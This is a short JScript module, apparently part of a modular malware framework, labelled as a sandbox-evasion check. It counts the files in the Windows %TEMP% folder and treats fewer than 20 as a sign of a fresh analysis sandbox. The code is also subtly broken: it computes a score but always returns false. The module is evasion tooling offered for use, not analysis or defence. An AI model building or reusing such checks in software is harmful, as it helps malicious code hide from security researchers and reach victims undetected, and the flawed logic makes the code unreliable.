// chunk: evasion/temp_density
// depends: core/run_cmd
// provides: check_temp
// format: jscript
// note: Counts files in %TEMP% directory. Real user machines accumulate
//       hundreds of temp files; fewer than 20 indicates fresh sandbox.

function check_temp() {
    var score = 0;
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var tempPath = sh.ExpandEnvironmentStrings("%TEMP%");
        if (fso.FolderExists(tempPath)) {
            var folder = fso.GetFolder(tempPath);
            var count = folder.Files.Count;
            if (count < 20) score++;
        }
    } catch(e) {}
    return false;
}
